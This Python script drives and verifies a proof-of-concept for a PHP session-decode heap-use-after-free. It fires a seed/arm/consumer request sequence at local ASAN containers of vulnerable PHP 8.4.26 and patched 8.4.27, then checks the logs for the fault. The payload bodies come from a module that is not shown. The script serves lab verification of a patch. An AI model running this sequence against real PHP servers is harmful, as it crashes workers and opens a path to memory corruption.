#!/usr/bin/env python3
"""Driver/verifier for session_decode_dangle.py (app-free BG(unserialize) arm).

Runs the seed/seed/arm/consumer sequence against the ASAN `php -S` differential:
VULN = cli-asan-128 (:8405, 8.4.26 @128M) -> consumer kills the worker + ASAN
heap-use-after-free at var_unserializer.re:166; FIXED = cli-asan-fixed (:8086,
8.4.27) -> worker survives, no UAF. (VULN needs 128M; cli-asan-128 is the core
cli-asan image with memory_limit raised to 128M. FIXED cli-asan-fixed is 16M,
which is fine for the patched side - the fix is memory-independent, so a stage
may 500 from the 16M OOM but the worker living = patched.)

Lab: docker compose up -d cli-asan-128 cli-asan-fixed   (teardown: docker compose stop cli-asan-128 cli-asan-fixed)

Usage:
    python3 -I verify_session_decode_dangle.py [--no-fixed]
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import session_decode_dangle as sdd  # noqa: E402
from common.http_urllib import http, worker_alive  # noqa: E402
from common.multipart import multipart_default as multipart  # noqa: E402
from common.session_ids import SID_A, SID_B  # noqa: E402

_BRINGUP = "    docker compose up -d cli-asan-128 cli-asan-fixed"


def fire_sequence(base, post_path, get_path):
    """Run the app-free seed/GET/seed/GET/arm/consumer sequence. Returns
    (arm_status, consumer_status, worker_alive_after)."""
    base = base.rstrip("/")

    def send(parts):
        body, headers = multipart(parts)
        return http(base + post_path, data=body, headers=headers, timeout=60)[0]

    send(sdd.seed_body(SID_A, tag=b"A"))
    http(base + get_path, timeout=20)                   # reset BG(unserialize)
    send(sdd.seed_body(SID_B, tag=b"B"))
    http(base + get_path, timeout=20)                   # reset again
    arm = send(sdd.arm_body(SID_A))                     # OOM in pre-RINIT decode
    con = send(sdd.consumer_body(SID_B))                # hits the dangle
    return arm, con, worker_alive(base, timeout=8)


def asan_uaf(container):
    """True iff the container log shows the decode-site heap-use-after-free."""
    try:
        r = subprocess.run(["docker", "logs", container],
                           capture_output=True, timeout=30)
        log = (r.stdout + r.stderr).decode("utf-8", "replace")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None
    return ("heap-use-after-free" in log
            and "var_unserializer.re:166" in log
            and "ps_srlzr_decode_php" in log)


def phase(label, url, container, expect_uaf):
    print("\n== %s: %s (container=%s) ==" % (label, url, container))
    arm, con, alive = fire_sequence(url, "/poc.php", "/index.php")
    uaf = asan_uaf(container)
    print("   arm=%r  consumer=%r  worker_alive_after=%r  asan_uaf_in_log=%r"
          % (arm, con, alive, uaf))
    if expect_uaf:
        ok = (alive is False) and (uaf is True)
        print("   -> %s: 8.4.26 app-free arm leaves BG(unserialize) dangling; the "
              "consumer's pre-RINIT decode faults in tmp_var (var_unserializer.re:166)."
              % ("PASS" if ok else "FAIL"))
        if uaf is None:
            print("      (could not read `docker logs %s` -- worker-death alone is "
                  "suggestive but the ASAN report is the definitive check)" % container)
    else:
        ok = (alive is True) and (uaf is not True)
        print("   -> %s: 8.4.27 completes every stage, worker survives, no UAF "
              "(patch 3584a98 resets the session globals pre-decode)."
              % ("PASS" if ok else "FAIL"))
    return ok


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--vuln-url", default="http://127.0.0.1:8405")
    ap.add_argument("--fixed-url", default="http://127.0.0.1:8086")
    ap.add_argument("--vuln-container", default="p2s-sdd-vuln")
    ap.add_argument("--fixed-container", default="php2shell-cli-asan-fixed-1")
    ap.add_argument("--no-fixed", action="store_true",
                    help="verify the vulnerable half only")
    args = ap.parse_args()

    need = [(args.vuln_url, "vuln")] + ([] if args.no_fixed else [(args.fixed_url, "fixed")])
    for url, which in need:
        if not worker_alive(url, timeout=8):
            print("[-] %s lab not reachable at %s. Bring it up (128M; the stock "
                  "16M cli-asan does not reproduce):\n%s" % (which, url, _BRINGUP))
            return 2

    results = [phase("VULN", args.vuln_url, args.vuln_container, expect_uaf=True)]
    if not args.no_fixed:
        results.append(phase("FIXED", args.fixed_url, args.fixed_container, expect_uaf=False))

    ok = all(results)
    print("\n== VERDICT: %s ==" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
